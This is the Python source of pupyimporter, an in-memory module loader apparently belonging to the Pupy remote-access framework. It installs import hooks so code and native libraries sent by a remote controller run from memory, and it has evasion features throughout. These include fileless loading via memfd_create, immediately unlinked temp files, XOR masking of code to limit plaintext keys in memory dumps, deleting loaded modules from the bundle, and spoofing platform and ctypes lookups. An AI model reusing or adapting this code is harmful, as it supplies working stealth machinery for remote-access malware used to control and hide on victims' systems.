# -*- coding: utf-8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------
# This module uses the builtins modules pupy and _memimporter to load python modules and packages from memory, including .pyd files (windows only)
# Pupy can dynamically add new modules to the modules dictionary to allow remote importing of python modules from memory !
#
import sys
import imp
import marshal
import gc

if hasattr(sys.platform, 'addtarget'):
    sys.platform.addtarget(None)

__debug = False
__trace = False
__dprint_method = None

if not hasattr(sys, '__pupyimporter_modules'):
    setattr(sys, '__pupyimporter_modules', {})

if not hasattr(sys, '__pupyimporter_dlls'):
    setattr(sys, '__pupyimporter_dlls', set())

from sys import __pupyimporter_modules as modules
from sys import __pupyimporter_dlls as dlls

def dprint(msg):
    global __debug
    global __dprint_method

    if __dprint_method is None:
        if __debug:
            print msg
    else:
        __dprint_method(msg)

def loadpy(src, dst, masked=False):
    src = bytes(src)
    content = src

    if masked:
        # Poors man "obfuscation", just to reduce (a bit) amount of our
        # plaintext keys in mem dump
        content = bytearray(len(src))
        for i,x in enumerate(src):
            content[i] = chr(ord(x)^((2**((65535-i)%65535))%251))

    exec (marshal.loads(bytes(content)), dst)

def find_writable_folder():
    dprint('Search writable folder')

    if hasattr(sys, '__pupyimporter_writable_folder'):
        return sys.__pupyimporter_writable_folder

    from tempfile import mkstemp, gettempdir
    from os import chmod, unlink, close, access, X_OK

    temporary_folders = [gettempdir()]
    if sys.platform != 'win32':
        temporary_folders = [
            '/dev/shm', '/tmp', '/var/tmp', '/run'
        ] + temporary_folders

    dprint('find_writable_folder: possible folders: {}'.format(
        ':'.join(list(temporary_folders))))

    for folder in temporary_folders:
        fd, name = None, None
        try:
            fd, name = mkstemp(prefix='tdll', dir=folder)

            if sys.platform != 'win32':
                try:
                    chmod(name, 0777)
                    if not access(name, X_OK):
                        dprint('find_writable_folder: Noexec location {}'.format(name))
                        continue

                except Exception, e:
                    dprint('find_writable_folder: {}: {}'.format(name, e))
                    continue

        except Exception, e:
            dprint('find_writable_folder: dir={}: {}'.format(folder, e))
            continue

        finally:
            if fd is not None:
                close(fd)

            if name is not None:
                try:
                    unlink(name)
                except:
                    pass

        setattr(sys, '__pupyimporter_writable_folder', folder)
        return folder

def get_tmpfile_function():
    from tempfile import mkstemp
    import platform

    is_java = False
    if platform.system() == 'Java':
        is_java = True

    if sys.platform.startswith('linux'):
        maj, min = platform.release().split('.')[:2]
        if not is_java and maj >= 3 and min >= 13:
            __NR_memfd_create_syscall = {
                'x86_64':   319,
                '__i386__': 356,
                'arm':      385,
            }

            machine = platform.machine()
            if machine.startswith('arm'):
                machine = 'arm'

            __NR_memfd_create = __NR_memfd_create_syscall.get(machine)
            if __NR_memfd_create:
                import errno
                import ctypes
                from os import getpid, close

                libc = ctypes.CDLL(None)
                syscall = libc.syscall

                def memfd_create(name=None):
                    fd = syscall(__NR_memfd_create, name or 'heap', 0x1)
                    if fd != -1:
                        return fd, '/proc/{}/fd/{}'.format(getpid(), fd)

                    err = ctypes.get_errno()
                    raise OSError(err, errno.errorcode.get(err, 'Unknown error'))

                try:
                    fd, _ = memfd_create('probe')
                    close(fd)
                    return memfd_create
                except:
                    pass

    folder = find_writable_folder()

    if folder:
        def mkstemp_create(name=None):
            suffix = '.dll' if sys.platform == 'win32' else ''

            dprint('Create tempforary file: suffix={}, folder={}'.format(
                suffix, folder))

            return mkstemp(
                prefix=name or 'tmp',
                suffix=suffix, dir=folder)

        return mkstemp_create

def py_memimporter():
    create_tmpfile = get_tmpfile_function()

    if not create_tmpfile:
        return None

    from os import write, close, unlink
    from os.path import basename
    import platform
    import ctypes

    ctx = None
    _Py_PackageContext = None

    for basemodule in (None, 'python27'):
        try:
            ctx = ctypes.CDLL(basemodule)
        except:
            pass

    if ctx:
        try:
            _Py_PackageContext = ctypes.c_char_p.in_dll(ctx, '_Py_PackageContext')
        except:
            pass

    INITIALIZER = ctypes.PYFUNCTYPE(None)

    class MemImporter(object):
        __slots__ = ('_create_tmpfile')

        def __init__(self, create_tmpfile):
            self._create_tmpfile = create_tmpfile

        def import_module(self, data, initfuncname, fullname, path):
            return self.load_library(
                data, fullname, dlopen=False,
                initfuncname=initfuncname)

        def _load_library(self, fullname, data, initfuncname):
            fd, name = self._create_tmpfile()
            fd_closed = False

            dprint('pymemimporter: load_library: {}, {}, {}, {}; system: {}'.format(
                fullname, len(data), initfuncname, name, platform.system()))
            try:
                try:
                    write(fd, data)
                except:
                    write(fd, bytearray(data))

                if sys.platform == 'win32':
                    close(fd)
                    fd_closed = True

                fullname = basename(fullname)
                dprint('pymemimporter loader. Modulename: {}'.format(fullname))

                modulename = fullname.split('.')[-1]

                if not initfuncname:
                    initfuncname = 'init' + modulename

                dprint('pymemimporter: Initializer: {}@{}'.format(initfuncname, name))

                try:
                    lib = ctypes.PyDLL(name)
                    dprint('pymemimporter: Library loaded: {}'.format(lib))
                except:
                    lib = ctypes.CDLL(name)
                    dprint('pymemimporter: Library loaded: {} (fallback CDLL)'.format(lib))

                func = lib[initfuncname]
                dprint('pymemimporter: Function found: {}'.format(func))

                if func:
                    func = INITIALIZER(func)

                    oldctx = None

                    if _Py_PackageContext:
                        oldctx = _Py_PackageContext.value
                        _Py_PackageContext.value = modulename

                    dprint('pymemimporter: Calling initializer ({}@{}) ....'.format(func, modulename))
                    func()
                    dprint('pymemimporter: .... complete')

                    if _Py_PackageContext:
                        _Py_PackageContext.value = oldctx

                else:
                    dprint('pymemimporter: init function "{}" not found in {}'.format(initfuncname, name))

                result = __import__(modulename)
                dprint('pymemimporter: Result: {}'.format(result))
                return result

            except Exception, e:
                dprint('pymemimporter: {} / {} - load failed: {}'.format(fullname, name, e))

            finally:
                if not fd_closed:
                    close(fd)

                try:
                    unlink(name)
                except:
                    pass

        def load_library(self, data, fullname, dlopen=True, initfuncname=None):
            if dlopen:
                return ctypes.CDLL(fullname)
            else:
                return self._load_library(fullname, data, initfuncname)

    dprint('Creating memimporter...')
    x = MemImporter(create_tmpfile)
    dprint(x)
    return x


def memtrace(msg):
    global __debug
    global __trace
    if __debug and __trace:
        import time
        import os
        import cPickle
        import gc

        msg = msg or 'unknown'
        msg = msg.replace('/', '_')

        gc.collect()
        snapshot = __trace.take_snapshot()

        if not os.path.isdir('/tmp/pupy-traces'):
            os.makedirs('/tmp/pupy-traces')

        with open('/tmp/pupy-traces/{}-{}'.format(time.time(), msg), 'w+b') as out:
            cPickle.dump(snapshot, out)

try:
    import _memimporter
    builtin_memimporter = True
    allow_system_packages = False

except ImportError:
    builtin_memimporter = False
    allow_system_packages = True

    try:
        dprint('Fallback to PyMemimporter')
        _memimporter = py_memimporter()
        dprint('Fallback to PyMemimporter.. complete: {}'.format(_memimporter))
        builtin_memimporter = bool(_memimporter)
    except Exception, e:
        dprint('PyMemimporter implementation disabled: {}'.format(e))
        builtin_memimporter = None

dprint('PyMemimporter: {}'.format(builtin_memimporter))

remote_load_package = None
remote_print_error = None

try:
    import pupy
    if hasattr(pupy, 'get_modules') and not modules:
        modules = pupy.get_modules()
except ImportError:
    pass

def get_module_files(fullname):
    """ return the file to load """
    path = fullname.replace('.','/')

    files = [
        module for module in modules.iterkeys() \
        if module.rsplit(".",1)[0] == path or any([
            path+'/__init__'+ext == module for ext in [
                '.py', '.pyc', '.pyo', '.pye'
            ]
        ])
    ]

    if len(files) > 1:
        # If we have more than one file, than throw away dlls
        retfiles = [x for x in files if not x.endswith('.dll')]
        del files[:]
        return retfiles

    return files

def pupy_add_package(pkdic, compressed=False, name=None):
    """ update the modules dictionary to allow remote imports of new packages """

    global remote_print_error

    import cPickle
    import zlib

    if compressed:
        pkdic = zlib.decompress(pkdic)

    module = cPickle.loads(pkdic)
    del pkdic

    if __debug__:
        dprint('Adding files: {}'.format(module.keys()))

    modules.update(module)

    del module

    if name:
        try:
            __import__(name)
        except:
            import traceback
            message = 'Error during preimport {}: {}'.format(
                name, str(traceback.format_exc()))

            if remote_print_error:
                remote_print_error(message)
            else:
                dprint(message)

    gc.collect()

    if __debug__:
        memtrace(name)

def has_module(name):
    try:
        if name in sys.modules or \
          name in sys.builtin_module_names or \
          name in modules:
            return True

        fsname = name.replace('.', '/')
        fsnames = (
            '{}.py'.format(fsname),
            '{}/__init__.py'.format(fsname),
            '{}.pyd'.format(fsname),
            '{}.so'.format(fsname)
        )

        for module in modules:
            if module.startswith(fsnames):
                return True

        if allow_system_packages:
            try:
                imp.find_module(name)
                return True

            except ImportError:
                pass

        return False

    except Exception, e:
        dprint('has_module Exception: {}/{} (type(name) == {})'.format(
            type(e), e, type(name)))

def has_dll(name):
    return name in dlls

def new_modules(names):
    dprint('new_modules call: {}/{}'.format(type(names), len(names)))

    try:
        return [
            name for name in names if not has_module(name)
        ]
    except Exception, e:
        dprint('new_modules Exception: {}/{} (type(names) == {})'.format(
            type(e), e, type(names)))

        return names

def new_dlls(names):
    return [
        name for name in names if not has_dll(name)
    ]

def load_dll(name, buf):
    if name in dlls:
        return True

    import pupy
    if hasattr(pupy, 'load_dll'):
        if pupy.load_dll(name, buf):
            dlls.add(name)
            return True

    return False

def invalidate_module(name):
    import pupy

    for item in modules.keys():
        if item == name or item.startswith(name+'/'):
            dprint('Remove {} from pupyimporter.modules'.format(item))
            del modules[item]

    for item in sys.modules.keys():
        if not (item == name or item.startswith(name+'.')):
            continue

        mid = id(sys.modules[item])

        del sys.modules[item]

        if hasattr(pupy, 'namespace'):
            dprint('Remove {} from rpyc namespace'.format(item))
            pupy.namespace.__invalidate__(item)

        if __debug__:
            global __debug
            if __debug:
                dprint('Remove {} from sys.modules'.format(item))

                item_str = str(item)
                del item

                for obj in gc.get_objects():
                    if id(obj) == mid:
                        dprint('Module {} still referenced by {}'.format(
                            item_str, [id(x) for x in gc.get_referrers(obj)]))

    gc.collect()

class DummyPackageLoader(object):
    __slots__ = ()

    def load_module(self, fullname):
        return sys.modules[fullname]

class SubstitutePackageLoader(object):
    __slots__ = ('substitute_fullname')

    def __init__(self, substitute_fullname):
        self.substitute_fullname = substitute_fullname

    def load_module(self, fullname):
        return sys.modules[self.substitute_fullname]

class PupyPackageLoader(object):
    __slots__ = (
        'fullname', 'contents', 'extension',
        'is_pkg', 'path', 'archive'
    )

    def __init__(self, fullname, contents, extension, is_pkg, path):
        self.fullname = fullname
        self.contents = contents
        self.extension = extension
        self.is_pkg = is_pkg
        self.path = path
        self.archive = '' #need this attribute

    def load_module(self, fullname):
        global remote_print_error

        imp.acquire_lock()
        try:
            dprint('loading module {}'.format(fullname))

            if fullname.startswith('Cryptodome'):
                parts = fullname.split('.')
                if parts[0] == 'Cryptodome':
                    parts[0] = 'Crypto'

                new_fullname = '.'.join(parts)

                dprint('Rename: {} -> {}'.format(
                    fullname, new_fullname))

                fullname = new_fullname

            if fullname in sys.modules:
                return sys.modules[fullname]

            mod = None
            if self.extension=='py':
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = 'pupy://{}'.format(self.path)
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                code = compile(self.contents, mod.__file__, 'exec')
                sys.modules[fullname] = mod
                exec (code, mod.__dict__)

            elif self.extension in ('pyc','pyo','pye'):
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = 'pupy://{}'.format(self.path)
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                sys.modules[fullname] = mod
                try:
                    dprint('Load {} from marshalled file ({})'.format(fullname, self.extension))
                    loadpy(self.contents[8:], mod.__dict__, self.extension == 'pye')
                except Exception, e:
                    message = 'Load {} failed: Exception: {}'.format(fullname, e)
                    if remote_print_error:
                        remote_print_error(message)
                    else:
                        dprint(message)

            elif self.extension in ('dll', 'pyd', 'so'):
                if '.' in fullname:
                    packagename, modulename = fullname.rsplit(".",1)
                else:
                    packagename = modulename = fullname

                initname = "init" + modulename
                path = self.fullname.rsplit('.', 1)[0].replace(".",'/') + "." + self.extension
                dprint('Loading {} from memory'.format(fullname))
                dprint('init={} fullname={} path={}'.format(initname, fullname, path))
                mod = _memimporter.import_module(self.contents, initname, fullname, path)
                if mod:
                    mod.__name__ = modulename
                    mod.__file__ = 'pupy://{}'.format(self.path)
                    mod.__package__ = packagename
                    sys.modules[fullname] = mod

            try:
                memtrace(fullname)
            except Exception, e:
                dprint('memtrace failed: {}'.format(e))

        except Exception as e:
            if fullname in sys.modules:
                del sys.modules[fullname]

            import traceback

            if remote_print_error:
                try:
                    dprint('Call remote_print_error() - error loading package {} - start'.format(fullname))
                    remote_print_error("Error loading package {} ({} pkg={}) : {}".format(
                        fullname, self.path, self.is_pkg, traceback.format_exc()))
                    dprint('Call remote_print_error() - error loading package {} - complete'.format(fullname))
                except:
                    pass
            else:
                dprint('PupyPackageLoader: Error importing %s : %s'%(fullname, traceback.format_exc()))

            raise e

        finally:
            self.contents = None
            imp.release_lock()
            gc.collect()

        return sys.modules[fullname]

class PupyPackageFinderImportError(ImportError):
    __slots__ = ()

class PupyPackageFinder(object):
    __slots__ = ()

    search_lock = None
    search_set = set()

    def __init__(self, path=None):
        if path and not path.startswith('pupy://'):
            raise PupyPackageFinderImportError()

    def find_module(self, fullname, path=None, second_pass=False):
        if fullname.startswith('exposed_'):
            return None

        if fullname.startswith('Cryptodome'):
            parts = fullname.split('.')
            if parts[0] == 'Cryptodome':
                parts[0] = 'Crypto'
                fullname = '.'.join(parts)
                if fullname in sys.modules:
                    return SubstitutePackageLoader(fullname)

        global remote_load_package
        global builtin_memimporter

        dprint('Find module: {}/{}/{}'.format(fullname, path, second_pass))

        if not second_pass:
            imp.acquire_lock()

        selected = None

        try:
            files=[]
            if fullname in ('pywintypes', 'pythoncom'):
                fullname = fullname + '27.dll'
                files = [fullname]
            else:
                files = get_module_files(fullname)

            dprint('[L] find_module({},{}) in {})'.format(fullname, path, files))
            if not builtin_memimporter:
                dprint('[L] find_module: filter out native libs')
                files = [
                    f for f in files if not f.lower().endswith(('.pyd','.dll','.so'))
                ]

            if not files:
                files = []

                dprint('{} not found in {}: not in {} files'.format(
                    fullname, files, len(files)))

                if remote_load_package and not second_pass:
                    parts = fullname.split('.')[:-1]

                    for i in xrange(len(parts)):
                        part = '.'.join(parts[:i+1])
                        if part in modules or part in sys.modules:
                            return None

                    if PupyPackageFinder.search_lock is not None:
                        with PupyPackageFinder.search_lock:
                            if fullname in PupyPackageFinder.search_set:
                                return None
                            else:
                                PupyPackageFinder.search_set.add(fullname)

                    try:
                        dprint('Remote load package {}'.format(fullname))
                        packages, dlls = remote_load_package(fullname)
                        dprint('Remote load package {} - success'.format(fullname))
                        if not packages and not dlls:
                            dprint('Remote load package {} - not found'.format(fullname))
                        else:
                            if dlls:
                                dlls = pupy.obtain(dlls)
                                for name, blob in dlls:
                                    load_dll(name, blob)

                            if packages:
                                pupy_add_package(packages, True, fullname)

                            if fullname in sys.modules:
                                return DummyPackageLoader()

                            return self.find_module(fullname, second_pass=True)

                    except Exception as e:
                        dprint('Exception: {}'.format(e))

                    finally:
                        if PupyPackageFinder.search_lock is not None:
                            with PupyPackageFinder.search_lock:
                                PupyPackageFinder.search_set.remove(fullname)

                return None

            criterias = [
                lambda f: any([
                    f.endswith('/__init__'+ext) for ext in [
                        '.pye', '.pyo', '.pyc', '.py'
                    ]
                ]),
                lambda f: any([
                    f.endswith(ext) for ext in [
                        '.pye', '.pyo', '.pyc'
                    ]
                ]),
                lambda f: any([
                    f.endswith(ext) for ext in [
                        '.pyd', '.py', '.so', '.dll'
                    ]
                ]),
            ]

            selected = None
            for criteria in criterias:
                for pyfile in files:
                    if criteria(pyfile) and pyfile in modules:
                        selected = pyfile
                        break

            if not selected:
                dprint('{} not selected from {}'.format(fullname, files))
                return None

            del files[:]

            content = modules[selected]
            dprint('{} found in "{}" / size = {}'.format(fullname, selected, len(content)))

            extension = selected.rsplit(".",1)[1].strip().lower()
            is_pkg = any([
                selected.endswith('/__init__'+ext) for ext in ['.pye', '.pyo', '.pyc', '.py']
            ])

            dprint('--> Loading {} ({}) package={}'.format(
                fullname, selected, is_pkg))

            return PupyPackageLoader(fullname, content, extension, is_pkg, selected)

        except Exception as e:
            dprint('--> Loading {} failed: {}/{}'.format(fullname, e, type(e)))
            if 'traceback' in sys.modules:
                import traceback
                traceback.print_exc(e)
            raise e

        finally:
            # Don't delete network.conf module
            if selected and \
              not selected.startswith(('network/conf', 'pupytasks')) and \
              selected in modules:
                dprint('[L] {} remove {} from bundle / count = {}'.format(fullname, selected, len(modules)))
                del modules[selected]

            if not second_pass:
                imp.release_lock()

            gc.collect()

def native_import(name):
    if PupyPackageFinder.search_lock is not None:
        with PupyPackageFinder.search_lock:
            if name in PupyPackageFinder.search_set:
                return False
            else:
                PupyPackageFinder.search_set.add(name)

    try:
        __import__(name)
        return True

    except:
        return False

    finally:
        if PupyPackageFinder.search_lock is not None:
            with PupyPackageFinder.search_lock:
                PupyPackageFinder.search_set.remove(name)

def register_package_request_hook(hook):
    global remote_load_package

    remote_load_package = hook

def register_package_error_hook(hook):
    global remote_print_error
    import rpyc

    remote_print_error = rpyc.async(hook)

def unregister_package_error_hook():
    global remote_print_error
    remote_print_error = None

def unregister_package_request_hook():
    global remote_load_package
    remote_load_package = None

def install(debug=None, trace=False):
    global __debug
    global __trace
    global __dprint_method

    if debug:
        __debug = True

    if trace:
        __trace = trace

    try:
        gc.set_threshold(128)
    except NotImplementedError:
        pass

    if allow_system_packages:
        dprint('Install pupyimporter + local packages')

        sys.path_hooks.append(PupyPackageFinder)
        sys.path.append('pupy://')

    else:
        dprint('Install pupyimporter - standalone')

        del sys.meta_path[:]
        del sys.path[:]
        del sys.path_hooks[:]
        sys.path_hooks = [PupyPackageFinder]
        sys.path.append('pupy://')
        sys.path_importer_cache.clear()

        import platform
        platform._syscmd_uname = lambda *args, **kwargs: ''
        platform.architecture = lambda *args, **kwargs: (
            '32bit' if pupy.get_arch() == 'x86' else '64bit', ''
        )

    if __debug__:
        try:
            if __trace:
                __trace = __import__('tracemalloc')

            if __debug and __trace:
                dprint('tracemalloc enabled')
                __trace.start(10)

        except Exception, e:
            dprint('tracemalloc init failed: {}'.format(e))
            __trace = None

    import ctypes

    have_ctypes_util = False
    have_ctypes_dlopen = hasattr(ctypes, '_dlopen')

    try:
        import ctypes.util
        have_ctypes_util = True
    except ImportError:
        pass


    import os
    import threading

    PupyPackageFinder.search_lock = threading.Lock()

    if have_ctypes_dlopen:
        ctypes._system_dlopen = ctypes._dlopen

    if have_ctypes_util:
        ctypes.util._system_find_library = ctypes.util.find_library

        if hasattr(ctypes.util, '_findLib_gcc'):
            ctypes.util._findLib_gcc = lambda name: None
    else:
        ctypes_util = imp.new_module('ctypes.util')
        ctypes_util.__name__ = 'pupy'
        ctypes_util.__file__ = 'pupy://ctypes/util.pyV'
        ctypes_util.__package__ = 'ctypes'
        sys.modules['ctypes.util'] = ctypes_util

        name_patterns = [
            'lib{}.so', '{}.so',
            'lib{}.pyd', '{}.pyd',
            'lib{}.dll', '{}.dll',
            'lib{}27.dll'
        ]

        # TODO: Add search paths

        def find_library(name):
            for pattern in name_patterns:
                libname = name_patterns.format(name)
                try:
                    return ctypes.CDLL(libname)
                except:
                    pass

        ctypes_util._system_find_library = find_library

    def pupy_make_path(name):
        if not name:
            return
        if 'pupy:' in name:
            name = name[name.find('pupy:')+5:]
            name = os.path.relpath(name)
            name = '/'.join([
                x for x in name.split(os.path.sep) if x and x not in ('.', '..')
            ])

        return name

    def pupy_find_library(name):
        pupyized = pupy_make_path(name)
        if pupyized in modules:
            dprint("FIND LIBRARY: {} => {}".format(name, pupyized))
            return pupyized
        else:
            return ctypes.util._system_find_library(name)

    def pupy_dlopen(name, *args, **kwargs):
        dprint("ctypes dlopen: {}".format(name))
        name = pupy_make_path(name)
        dprint("ctypes dlopen / pupyized: {}".format(name))

        if name in modules:
            if hasattr(_memimporter, 'load_library'):
                try:
                    library = _memimporter.load_library(modules[name], name)
                    del modules[name]
                    return library
                except:
                    pass
            elif hasattr(pupy, 'load_dll'):
                try:
                    library = pupy.load_dll(name, modules[name])
                    del modules[name]
                    return library
                except:
                    pass

        return ctypes._system_dlopen(name, *args, **kwargs)

    if 'pupy' in sys.modules and hasattr(pupy, 'find_function_address'):
        ctypes.CDLL_ORIG = ctypes.CDLL

        class PupyCDLL(ctypes.CDLL_ORIG):
            __slots__ = ('_FuncPtr_orig', '_FuncPtr', '_name')

            def __init__(self, name, **kwargs):
                super(PupyCDLL, self).__init__(name, **kwargs)
                self._FuncPtr_orig = self._FuncPtr
                self._FuncPtr = self._find_function_address
                self._name = pupy_make_path(self._name)
                dprint('CDLL({})'.format(self._name))

            def _find_function_address(self, search_tuple):
                name, handle = search_tuple
                dprint("PupyCDLL._find_function_address: {}".format(name))
                if not type(name) in (str, unicode):
                    return self._FuncPtr_orig(search_tuple)
                else:
                    addr = pupy.find_function_address(self._name, name)
                    dprint("PupyCDLL._find_function_address: {} = {}".format(name, addr))
                    if addr:
                        return self._FuncPtr_orig(addr)
                    else:
                        return self._FuncPtr_orig(search_tuple)

        class PupyPyDLL(PupyCDLL):
            _func_flags_ = ctypes._FUNCFLAG_CDECL | ctypes._FUNCFLAG_PYTHONAPI

            def __init__(self, name, **kwargs):
                if name == 'python dll':
                    name = 'python27.dll'
                    kwargs['handle'] = False

                super(PupyPyDLL, self).__init__(name, **kwargs)

        ctypes.CDLL = PupyCDLL
        ctypes.PyDLL = PupyPyDLL

    ctypes._dlopen = pupy_dlopen
    ctypes.util.find_library = pupy_find_library

    if sys.platform == 'win32':
        import pywintypes
        assert pywintypes

    if builtin_memimporter:
        # Workarounds for libpython

        libpython = None

        if sys.platform == 'win32':
            try:
                libpython = ctypes.PyDLL('python27.dll', handle=False)
            except WindowsError:
                dprint('python27.dll not found')
        else:
            try:
                libpython = ctypes.PyDLL('libpython2.7.so.1.0')
            except OSError:
                dprint('libpython2.7.so.1.0 not found')

        if libpython:
            ctypes.pythonapi = libpython

    import logging
    logger = logging.getLogger().getChild('ppi')
    __dprint_method = logger.debug

    dprint('pupyimporter initialized')
